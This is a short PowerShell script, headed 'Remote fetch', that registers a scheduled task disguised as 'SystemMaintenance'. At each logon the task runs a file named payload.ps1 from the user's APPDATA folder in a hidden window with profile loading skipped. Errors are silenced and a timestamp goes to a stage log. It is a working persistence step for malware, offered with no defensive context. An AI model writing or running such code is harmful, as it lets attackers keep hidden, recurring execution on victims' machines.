
<# Remote fetch #>
[CmdletBinding()]
param(
    [string]$TaskName = 'SystemMaintenance',
    [string]$ScriptPath = "$env:APPDATA\payload.ps1"
)
$TaskAction = New-ScheduledTaskAction -Execute "powershell.exe" -Argument ("-NoP -WindowStyle Hidden -File `"" + $ScriptPath + "`"")
Register-ScheduledTask -TaskName $TaskName -Action $TaskAction -Trigger (New-ScheduledTaskTrigger -AtLogOn) -Force -ErrorAction SilentlyContinue
Get-Date -Format "yyyy-MM-dd HH:mm:ss" | Out-File -FilePath "$env:TEMP\stage.log" -Append
